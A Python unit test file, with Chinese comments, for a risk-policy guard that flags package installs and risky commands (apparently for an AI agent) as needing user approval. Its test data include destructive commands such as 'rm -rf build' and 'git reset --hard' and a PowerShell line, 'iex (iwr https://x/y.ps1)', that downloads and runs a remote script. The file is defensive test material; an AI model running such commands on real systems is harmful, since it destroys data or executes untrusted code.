"""
tools/risk_policy.py 單元測試：安裝套件 / 高風險指令判定 (使用者規則的核心)

規則：只要需要安裝新套件一定要先同意；其他無風險任務直接執行；有風險的操作需同意。
新增或調整 risk_policy 的樣式時，請同步在這裡補上案例 (特別是「不應誤判」的案例)。
"""

import os
import sys
import unittest

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
if PROJECT_ROOT not in sys.path:
    sys.path.insert(0, PROJECT_ROOT)

from tests import netguard  # noqa: E402,F401  測試禁止連外

from tools.risk_policy import INSTALL_REASON, classify_risk, diff_packages, looks_like_install  # noqa: E402


class TestInstallDetection(unittest.TestCase):
    def test_install_commands_detected(self):
        for cmd in [
            "pip install requests", "pip3 install -U numpy", "python -m pip install pandas",
            "py -m pip install x", "uv add httpx", "uv pip install rich", "npm install", "npm i lodash",
            "winget install Git.Git", "Install-Module PSReadLine", "conda install numpy",
            "cd task && pip install -r requirements.txt", 'subprocess.run(["pip", "install", "x"])',
            "python setup.py install", "PIP INSTALL X",
        ]:
            with self.subTest(cmd=cmd):
                self.assertTrue(looks_like_install(cmd))
                self.assertIn(INSTALL_REASON, classify_risk(cmd, "shell"))

    def test_non_install_commands(self):
        for cmd in ["pip list", "pip show requests", "pip freeze > req.txt", "uv run python x.py",
                    "npm run build", "Get-InstalledModule", "echo installing"]:
            with self.subTest(cmd=cmd):
                self.assertFalse(looks_like_install(cmd))


class TestRiskClassification(unittest.TestCase):
    def test_risky_shell(self):
        for cmd in ["Remove-Item C:\\temp\\x -Recurse", "rm -rf build", "del /q *.tmp", "shutdown /s /t 0",
                    "Stop-Process -Name chrome", "git push origin main", "git reset --hard HEAD~1",
                    "Set-ExecutionPolicy Unrestricted", "reg add HKCU\\Software\\X /v Y", "iex (iwr https://x/y.ps1)"]:
            with self.subTest(cmd=cmd):
                self.assertIsNotNone(classify_risk(cmd, "shell"))

    def test_git_global_options_do_not_bypass(self):
        # worktree 流程 用 git -C <worktree> commit / push；全域選項不能讓守門失效
        for cmd in ['git -C "D:/wt/ticket-32" commit -m x', "git -C D:/wt/ticket-32 push -u origin ticket-32-x",
                    "git -c user.name=x commit -m y", "git --no-pager -C . reset --hard HEAD",
                    "git --git-dir=.git --work-tree=. commit -m x", "git -C 'C:\\a b' push"]:
            with self.subTest(cmd=cmd):
                self.assertIsNotNone(classify_risk(cmd, "shell"))
        for cmd in ['git -C "D:/wt/ticket-32" status', "git -C D:/wt add -A", "git -c core.pager=cat log"]:
            with self.subTest(cmd=cmd):
                self.assertIsNone(classify_risk(cmd, "shell"))

    def test_pm_code_read_guard_sees_git_c(self):
        from tools.risk_policy import code_read_violation
        self.assertIsNotNone(code_read_violation('git -C "D:/wt/ticket-32" diff', "shell"))

    def test_git_merge_with_global_options_detected(self):
        from tools.risk_policy import merge_violation
        self.assertIsNotNone(merge_violation('git -C "D:/wt" merge main && echo x', "shell"))

    def test_safe_shell(self):
        for cmd in ["Get-Date", "ipconfig", "Get-ChildItem C:\\Users", "git status", "git diff --stat",
                    "python main.py", "Get-Process | Sort-Object CPU", "echo 'format is fine'", "ls task-rm"]:
            with self.subTest(cmd=cmd):
                self.assertIsNone(classify_risk(cmd, "shell"))

    def test_python_scope(self):
        # Python 的 del 陳述式、名為 rd 的變數不能被當成刪除檔案
        self.assertIsNone(classify_risk("x = [1, 2]; del x[0]; print(x)", "python"))
        self.assertIsNone(classify_risk("rd = 3; print(rd)", "python"))
        self.assertIsNone(classify_risk("import pandas as pd; pd.read_csv('a.csv').to_excel('task/artifact/a.xlsx')", "python"))
        self.assertIsNotNone(classify_risk("import shutil; shutil.rmtree('task/old')", "python"))
        self.assertIsNotNone(classify_risk("os.remove('a.txt')", "python"))

    def test_multiple_reasons(self):
        reason = classify_risk("pip install x && rm -rf y", "shell")
        self.assertIn(INSTALL_REASON, reason)
        self.assertIn("刪除", reason)


class TestDiffPackages(unittest.TestCase):
    def test_diff(self):
        changes = diff_packages({"a": "1", "b": "1"}, {"a": "2", "c": "1"})
        self.assertEqual(len(changes), 3)
        self.assertTrue(any("新增 `c`" in c for c in changes))
        self.assertTrue(any("更新 `a`" in c for c in changes))
        self.assertTrue(any("移除 `b`" in c for c in changes))


if __name__ == "__main__":
    unittest.main()
